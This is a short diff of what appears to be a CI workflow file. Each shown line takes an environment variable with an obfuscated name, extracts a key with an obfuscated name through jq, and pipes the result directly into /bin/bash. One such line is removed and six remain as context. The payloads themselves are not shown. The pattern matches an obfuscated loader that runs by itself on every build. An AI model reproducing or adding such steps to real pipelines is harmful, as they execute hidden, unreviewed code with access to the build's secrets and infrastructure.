@@ -44,7 +44,6 @@ jobs:
           echo $fybd32 | jq -r .cez178 | /bin/bash
           echo $qlnk0133 | jq -r .zeh68 | /bin/bash
           echo $z21391 | jq -r .xfdb9893 | /bin/bash
-          echo $qgnfv02 | jq -r .ccz63018 | /bin/bash
           printf '%s' "$p6" | jq -r .xgfo8253 | /bin/bash
           echo $uoskj97886 | jq -r .r8 | /bin/bash
           echo $d40085 | jq -r .ex558 | /bin/bash
